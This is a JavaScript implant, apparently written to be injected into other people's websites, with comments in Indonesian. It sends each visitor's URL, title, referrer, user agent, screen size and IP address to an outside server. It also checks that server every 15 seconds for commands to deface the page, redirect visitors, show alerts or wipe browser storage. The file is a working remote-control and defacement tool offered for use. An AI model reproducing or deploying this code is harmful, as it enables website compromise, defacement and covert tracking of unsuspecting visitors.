    /**
 * X-Coder System v8.0 - FINAL
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    // ============================================================
    // FUNGSI
    // ============================================================
    function getDomain() {
        return window.location.hostname;
    }

    function sendData() {
        var data = {
            domain: getDomain(),
            url: window.location.href,
            path: window.location.pathname,
            title: document.title,
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            timestamp: new Date().toISOString(),
            ip: ''
        };

        // Ambil IP (opsional, kalo gagal tetap kirim)
        try {
            fetch('https://api.ipify.org?format=json')
                .then(function(r) { return r.json(); })
                .then(function(r) { data.ip = r.ip; })
                .catch(function() {});
        } catch(e) {}

        // Kirim data ke server
        try {
            fetch(SERVER, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // CEK PERINTAH DARI SERVER (SETIAP 15 DETIK)
    // ============================================================
    function checkCommand() {
        try {
            var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(getDomain());
            fetch(url)
                .then(function(r) { return r.json(); })
                .then(function(response) {
                    if (response && response.command) {
                        executeCommand(response.command, response);
                    }
                })
                .catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command received:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1 style="text-align:center;margin-top:20%;color:red;">HACKED NEXA</h1>';
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Storage cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    setTimeout(sendData, 1000);
    setInterval(sendData, 30000);
    setInterval(checkCommand, 15000);

    console.log('🔍 X-Coder System started on:', getDomain());
})();
